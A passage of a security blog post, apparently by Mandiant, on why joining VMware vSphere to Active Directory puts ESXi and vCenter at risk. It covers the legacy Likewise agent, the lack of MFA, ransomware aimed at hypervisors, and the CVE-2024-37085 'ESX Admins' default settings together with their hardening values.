introduce additional risk.</span></p>\n<p><span style=\"vertical-align: baseline;\">This blog post will logically break down the inherent risks and misunderstandings with integrating vSphere with Microsoft AD. Using Mandiant's deep experience of both vSphere ransomware incidents and proactive assessments of both AD and vSphere, we will provide a directive for understanding risk and increasing security posture aligned with today's threats in respect of enterprise vSphere management.</span></p>\n<p><span style=\"vertical-align: baseline;\">After learning about the risks, our next blog post contains <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/defending-vsphere-from-unc3944\" rel=\"noopener\" target=\"_blank\">actionable guidance on how to defend your VMware vSphere estate</a>. Additionally, register for our <a href=\"https://www.brighttalk.com/webcast/7451/648354?utm_source=blog\" rel=\"noopener\" target=\"_blank\">upcoming webinar to learn these strategies directly from Mandiant experts</a>.</span></p>\n<h2><span style=\"vertical-align: baseline;\">vSphere Infrastructure Overview</span></h2>\n<p><span style=\"vertical-align: baseline;\">To understand the security risks in a vSphere environment, it's essential to understand its architecture. A compromise at one layer can have cascading effects throughout the entire virtualized environment.</span></p>\n<p><span style=\"vertical-align: baseline;\">At its core, vSphere is a platform that pools physical datacenter resources like compute, storage, and networking into a flexible layer of virtual infrastructure, a task primarily accomplished by two key components, ESXi and vCenter, as shown in the following diagram:</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"vmware architecture overview\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/vmware-architecture-overview.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">ESXi (The Hypervisor):</strong><span style=\"vertical-align: baseline;\"> This is the foundational layer of vSphere. ESXi is a bare metal hypervisor, meaning it installs directly onto the physical server hardware without requiring an underlying operating system. Its core job is to partition that server into multiple, isolated virtual machines (VMs). Each VM, which is essentially just a collection of files, runs its own operating system and applications, acting like an independent computer. The hypervisor's minimal design is intentional, aiming to reduce its own attack surface while efficiently managing the server's resources.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">vCenter (The Control Plane):</strong><span style=\"vertical-align: baseline;\"> If ESXi hosts are the workers, the vCenter Server is the \"brain\" or control plane for the entire environment. It provides a single web-based interface to manage all connected ESXi hosts and the VMs they run. ESXi hosts are registered with vCenter, which uses agents on each host to manage operations and enable advanced features like automatic workload balancing and high availability for failover protection.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Integrating vSphere with AD creates a flexible environment that simplifies identity management, yet it introduces profound security risks. This direct link can turn an AD compromise into a significant threat against the entire vSphere deployment. </span></p>\n<h2><span style=\"vertical-align: baseline;\">An Outdated Blueprint: Re-examining Foundational vSphere Security</span></h2>\n<p><span style=\"vertical-align: baseline;\">Virtualization has been a cornerstone of enterprise IT for nearly two decades, solving server sprawl and delivering transformative operational agility. Alongside it, AD remains a pillar of enterprise IT. This has led to a long-standing directive that all enterprise technology, including critical infrastructure like vSphere, must integrate with AD for centralized authentication. The result is a risky dependency—the security of foundational infrastructure is now directly tied to the security of AD, meaning any compromise within AD becomes a direct threat to the entire virtualization environment.</span></p>\n<p><span style=\"vertical-align: baseline;\">In the past, vSphere security was often approached in distinct, siloed layers. Perimeter security was stringent, and threats were typically viewed as internal, such as configuration errors, rather than from external threat actors. This, combined with the newfound ease of image-based backups, often led to security efforts becoming primarily focused on robust business continuity and disaster recovery capabilities over proactive defense. As environments expanded, managing local user accounts created significant administrative overhead, so support for AD integration was introduced for centralized identity management.</span></p>\n<p><span style=\"vertical-align: baseline;\">Mandiant’s observation, based on extensive incident response engagements, is that many vSphere environments today still operate on this foundational architecture, carrying forward security assumptions that haven't kept pace with the evolving threat landscape. As Mandiant’s assessments frequently identify, these architectures often prioritize functionality and stability over a security design grounded in today's threats.</span></p>\n<p><span style=\"vertical-align: baseline;\">So what’s changed? Reliance solely on perimeter defenses is an outdated security strategy. The modern security boundary focuses on the user and device, typically protected by agent-based EDR solutions. But here lies the critical gap: The ESXi hypervisor, a purpose-built appliance, which, contrary to what many people believe, is not a standard Linux distribution. This specialized architecture inherently prevents the installation of external software, including security tools like EDR agents. vSphere documentation explicitly addresses this, stating:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\">\n<p><span style=\"vertical-align: baseline;\">“</span><span style=\"font-style: italic; vertical-align: baseline;\">The ESXi hypervisor is a specialized, purpose-built solution, similar to a network router’s firmware. While this approach has several advantages, it also makes ESXi unable to run “off-the-shelf” software, including security tools, designed for general-purpose operating systems as the ESXi runtime environment is dissimilar to other operating systems.</span></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">The use of Endpoint Detection and Response (EDR) and other security practices inside third-party guest operating systems is supported and recommended.\"</span></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Source: <a href=\"https://knowledge.broadcom.com/external/article?legacyId=80768\" rel=\"noopener\" target=\"_blank\">Broadcom</a></span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Consequently, most organizations focus their security efforts and EDR deployment inside the guest operating systems. This leaves the underlying ESXi hypervisor—the foundation of the entire virtualization environment—as a significant blind spot for security teams.</span></p>\n<h2><span style=\"vertical-align: baseline;\">The vSphere Threat Landscape</span></h2>\n<p><span style=\"vertical-align: baseline;\">The security gap at the hypervisor layer, which we detailed in the previous section, has not gone unnoticed by threat actors. As security for Windows-based operating systems matured with advanced EDR solutions, threat actors have pivoted to a softer, higher-value target—the ESXi hypervisor itself.</span></p>\n<p><span style=\"vertical-align: baseline;\">This pivot is amplified by common operational realities. The critical role of ESXi hosts often leads to a hesitancy to apply patches promptly for fear of disruption. Many organizations face a rapidly closing window to mitigate risks; however, threat actors aren't just relying on unpatched vulnerabilities. They frequently leverage compromised credentials, a lack of MFA, and simple misconfigurations to gain access.</span></p>\n<h2><span style=\"vertical-align: baseline;\">The Rise of Hypervisor-Aware Ransomware</span></h2>\n<p><span style=\"vertical-align: baseline;\">Ransomware targeting vSphere is fundamentally more devastating than its traditional Windows counterpart. Instead of encrypting files on servers or end user computers, these attacks aim to cripple the entire infrastructure by encrypting virtual disk files (VMDKs), disabling dozens of VMs at once.</span></p>\n<p><span style=\"vertical-align: baseline;\">This is not a theoretical threat. According to Google Threat Intelligence Group (GTIG), the focus on vSphere is rapidly increasing. Of the new ransomware families observed, the proportion specifically tailored for vSphere ESXi systems grew from ~2% in 2022 to over 10% in 2024. This demonstrates a clear and accelerating trend that threat actors are actively dedicating resources to build tooling that specifically targets the hypervisor. In incidents investigated by GTIG, threat actors most frequently deployed REDBIKE, RANSOMHUB, and LOCKBIT.BLACK variants.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"ransomware os trends chart\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/ransomware-os-trends.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">GTIG analysts have also noted a recent trend for threat actors to gain persistence to vSphere environments via reverse shells deployed on Virtual center. This enables a foothold to be obtained within the vSphere control plane and thus complete control over all infrastructure. This would typically manifest in into a two-pronged approach: a tactical data exfiltration such as an AD database (NTDS.dit) and then the deployment of ransomware and mass encryption of all VMs.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Understanding the Active Directory Integration in vSphere</span><strong style=\"vertical-align: baseline;\"> </strong></h2>\n<p><span style=\"vertical-align: baseline;\">The decision to integrate vSphere with AD often overlooks the specifics of how this connection actually works. To properly assess the risk, we must look beneath the surface at the technical components that enable this functionality. This analysis will deconstruct those key pieces: the legacy agent responsible for authentication, its inherent inability to support modern security controls like multi-factor authentication (MFA), and the insecure default trust relationships it establishes. By examining these foundational mechanisms, we can expose the direct line from a credential compromise to an infrastructure takeover.</span></p>\n<h2><span style=\"vertical-align: baseline;\">vSphere’s Likewise Agent</span></h2>\n<p><span style=\"vertical-align: baseline;\">When discussing vSphere's integration with AD, it's essential to distinguish between two separate components: vCenter Server and the ESXi hosts. Their respective AD integration options are independent and possess different capabilities. This connection is entirely facilitated by the Likewise agent.</span></p>\n<p><span style=\"vertical-align: baseline;\">The Likewise agent was originally developed by Likewise Software to allow Linux and Unix-based systems to join AD environments, enabling centralized identity management using standard protocols like Kerberos, NTLM, and LDAP/(S). The open-source edition, Likewise Open, included tools such as </span><code style=\"vertical-align: baseline;\">domainjoin-cli</code><span style=\"vertical-align: baseline;\"> and system daemons like </span><code style=\"vertical-align: baseline;\">lsassd</code><span style=\"vertical-align: baseline;\">, which are still found under the hood in ESXi and the vCenter Server Appliance (VCSA). vSphere embedded this agent starting with ESX 4.1 (released in 2010) to facilitate Integrated Windows Authentication (IWA). However, its function differs:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">In </span><strong style=\"vertical-align: baseline;\">ESXi</strong><span style=\"vertical-align: baseline;\">, the Likewise agent actively handles AD user authentication when configured.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">In </span><strong style=\"vertical-align: baseline;\">vCenter</strong><span style=\"vertical-align: baseline;\">, it is only used for the initial domain join when Integrated Windows Authentication (IWA) is selected as the identity source—all actual authentication is then handled by the vCenter Single Sign On (SSO) subsystem.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">The original Likewise Software was eventually absorbed by BeyondTrust, and the open-source edition of the agent is no longer actively maintained publicly. The </span><a href=\"http://github.com/vmware/likewise-open\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Likewise OSS project is now archived</span></a><span style=\"vertical-align: baseline;\"> and marked as inactive. It is understood the codebase is only maintained internally. </span><strong style=\"vertical-align: baseline;\">Note:</strong><span style=\"vertical-align: baseline;\"> The agent's build version remains identical at </span><code style=\"vertical-align: baseline;\">Likewise Version 6.2.0</code><span style=\"vertical-align: baseline;\"> across both ESXi 7 and 8.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"ESXi Likewise Agent versions\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/esxi-likewise-agent-versions.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: ESXi Likewise Agent versions</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The following table lists comparisons between native AD connection methods for both Virtual Center and ESXi.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Feature / Capability</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">ESXi Host</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">vCenter Server (VCSA)</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">AD Integration Method</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Integrated Windows Authentication (IWA) only</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">IWA and LDAP/LDAPS</span></p>\n<p><span style=\"vertical-align: baseline;\">Federated Identity (SAML, OIDC)</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Likewise Agent Used</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Yes – exclusively for IWA domain join and authentication</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Yes – Used for IWA domain join only</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Authentication Protocols Supported</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Kerberos (via IWA only)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Kerberos (IWA), LDAP(S), SAML, OIDC</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Modern Auth Support (OIDC, SAML, FIDO2)</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Not supported </span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Not supported via AD</span></p>\n<p><span style=\"vertical-align: baseline;\">Supported only</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">when using federated IdPs</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">MFA Support</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Not supported</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Not supported via</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">AD DS</span></p>\n<p><span style=\"vertical-align: baseline;\">Supported via Identity Federation (ADFS, Azure AD, etc.)</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Granular Role-Based Access Control (RBAC)</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Limited (via host profile or CLI only)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Advanced RBAC with vCenter SSO</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Why Not to Use Likewise-Based AD Integration (ESXi/vCenter)</span></h2>\n<p><span style=\"vertical-align: baseline;\">The following list contains considerations when using AD-based connections managed by the vSphere Likewise agent:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Deprecated software</strong><span style=\"vertical-align: baseline;\">: Likewise is legacy software, no longer maintained or supported upstream.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">No support for modern authentication</strong><span style=\"vertical-align: baseline;\">: Likewise only supports Integrated Windows Authentication (Kerberos) and offers no support for SAML, OIDC, or FIDO2.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">No MFA</strong><span style=\"vertical-align: baseline;\">: Likewise cannot enforce contextual policies such as MFA, geolocation restrictions, or time-based access.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Credential material stored locally</strong><span style=\"vertical-align: baseline;\">: Kerberos keytabs and cached credentials are stored unencrypted on disk.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">VMware recommends leveraging identity federation with modern identity providers</span><strong style=\"vertical-align: baseline;\">, </strong><span style=\"vertical-align: baseline;\">bypassing the limitations of the legacy Likewise-based stack. Broadcom announced on March 25 that </span><a href=\"https://knowledge.broadcom.com/external/article/314324/removal-of-integrated-windows-authentica.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">IWA will be removed</span></a><span style=\"vertical-align: baseline;\"> in the next major release. </span></p>\n<h2><span style=\"vertical-align: baseline;\">The MFA Gap</span></h2>\n<p><span style=\"vertical-align: baseline;\">While AD integration offers administrative convenience, it introduces significant security limitations, particularly regarding MFA. Traditional AD authentication methods, including Kerberos and NTLM, are inherently single-factor. These protocols do not natively support MFA, and the vCenter Likewise integration does not extend AD MFA enforcement to vCenter or ESXi.</span></p>\n<p><span style=\"vertical-align: baseline;\">Critically, ESXi does not support MFA in any form, nor does it support identity federation, SAML, or modern protocols such as OIDC or FIDO2. Even for vCenter, MFA can only be applied to users within the vSphere.local domain (using mechanisms like RSA SecurID or RADIUS), but not to AD-joined users authenticated through IWA or LDAP/S.</span></p>\n<p><span style=\"vertical-align: baseline;\">Ancillary solutions can offer proxy-based MFA that integrate with AD to enforce MFA to vSphere. AuthLite extends the native AD login process by requiring a second factor during Windows authentication, which can indirectly secure vCenter access when Integrated Windows Authentication is used. Silverfort operates at the domain controller level, enforcing MFA on authentication flows in real time without requiring agents on endpoints or changes to vCenter. Both solutions can help enforce MFA into vSphere environments that lack native support for it, but they can also introduce caveats such as added complexity and potential authorization loops if AD becomes dependent on the same infrastructure they protect and the need to treat their control planes or virtual appliances as Tier 0 systems within the vSphere environment.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%; height: 44.7943px;\">\n<tbody>\n<tr style=\"height: 44.7943px;\">\n<td style=\"width: 98.1839%; height: 44.7943px;\">\n<p><span style=\"font-style: italic; vertical-align: baseline;\">As a result, in organizations that integrate vSphere with traditional Active Directory, all access to critical vSphere infrastructure (ESXi and Virtual Center) remains protected by password alone and no MFA.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">While it is technically possible to enforce MFA in vSphere through Active Directory Federation Services (ADFS), this approach requires careful consideration. It is important to note that ADFS is still a feature included in Windows Server 2025 and is not on any official deprecation list with an end-of-life date. However, the lack of significant new feature development compared to the rapid innovation in Microsoft Entra ID speaks to its status as a legacy technology. This is underscored by the extensive migration resources Microsoft now provides to move applications away from AD FS and into Entra ID.</span></p>\n<p><span style=\"vertical-align: baseline;\">Therefore, while ADFS remains a supported feature, for the purposes of securing vSphere it is a complex workaround that doesn't apply to direct ESXi access and runs contrary to Microsoft's clear strategic direction toward modern, cloud-based identity solutions.</span></p>\n<p><span style=\"vertical-align: baseline;\">Another common approach involves Privileged Access Management (PAM). While a PAM-centric strategy offers benefits like centralized control and session auditing, several caveats warrant consideration. PAM systems add operational complexity, and the vCenter session itself is typically not directly federated with the primary enterprise identity provider (like Entra ID or Okta). Consequently, context-aware conditional access policies are generally applied only at the initial PAM logon, not within the vCenter session itself.</span></p>\n<p><span style=\"vertical-align: baseline;\">Ultimately, these workarounds do not address the core issue: vSphere’s reliance on the Likewise agent and traditional AD protocols prevents native MFA enforcement for AD users, leaving the environment vulnerable.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\">\n<p><span style=\"font-style: italic; vertical-align: baseline;\">There is a reliance on a delegated logon based on AD password complexity, and any MFA would have to be at the network access layer or workstation login, not at the vCenter login prompt for those users.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">The 'ESX Admins' Problem Is Not an ESXi Issue, It's a Trust Issue</span><strong style=\"vertical-align: baseline;\"> </strong></h2>\n<p><span style=\"vertical-align: baseline;\">In July 2024, </span><a href=\"https://www.microsoft.com/en-us/security/blog/2024/07/29/ransomware-operators-exploit-esxi-hypervisor-vulnerability-for-mass-encryption/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Microsoft published a blog post on CVE-2024-37085</span></a><span style=\"vertical-align: baseline;\">, an \"ESXi vulnerability\" that was considered a critical issue, and one that vSphere promptly addressed in a patch release. The CVE, present in vSphere ESXi for many years, involved several ESXi advanced settings utilizing insecure default configurations. Upon joining an ESXi host to an AD domain, the \"ESX Admins\" AD group is automatically granted an ESXi Admin role, potentially expanding the scope of administrative access beyond the intended users.</span></p>\n<p><span style=\"vertical-align: baseline;\">These settings are configured by the following ESXi controls:</span></p>\n<ol>\n<li><strong style=\"vertical-align: baseline;\">Config.HostAgent.plugins.hostsvc.esxAdminsGroupAutoAdd</strong>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">What it does</strong><span style=\"vertical-align: baseline;\">: This setting controls whether users from a designated administrators group are automatically added to the host’s local administrative group.</span></li>\n</ul>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Config.HostAgent.plugins.vimsvc.authValidateInterval</strong>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">What it does</strong><span style=\"vertical-align: baseline;\">: This setting defines the time interval at which the host’s management services validate the authentication credentials (or tickets) of connected clients.</span></li>\n</ul>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Config.HostAgent.plugins.hostsvc.esxAdminsGroup</strong>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">What it does:</strong><span style=\"vertical-align: baseline;\"> This parameter specifies the name (or identifier) of the group whose members are to be automatically considered for host administrative privileges (when auto-add is enabled by the first setting).</span></li>\n</ul>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">vSphere produced a manual workaround for <a href=\"https://knowledge.broadcom.com/external/article/369707/\" rel=\"noopener\" target=\"_blank\">prior versions of vSphere ESXi 8.0 Update 3</a></span><span style=\"vertical-align: baseline;\"> based on the following settings:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1px\" cellpadding=\"16px\" style=\"border-collapse: collapse; margin-left: auto; margin-right: auto;\"><colgroup><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Config.HostAgent.plugins.hostsvc.esxAdminsGroupAutoAdd from true to </span><strong style=\"font-style: italic; vertical-align: baseline;\">false</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Config.HostAgent.plugins.vimsvc.authValidateInterval from 1440 to </span><strong style=\"font-style: italic; vertical-align: baseline;\">90</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Config.HostAgent.plugins.hostsvc.esxAdminsGroup from \"ESX Admins\" to </span><strong style=\"font-style: italic; vertical-align: baseline;\">\"\"</strong><span style=\"font-style: italic; vertical-align: baseline;\"> </span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The following is a configuration fix to default settings in vSphere ESXi 8.0 Update 3:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1px\" cellpadding=\"16px\" style=\"border-collapse: collapse; 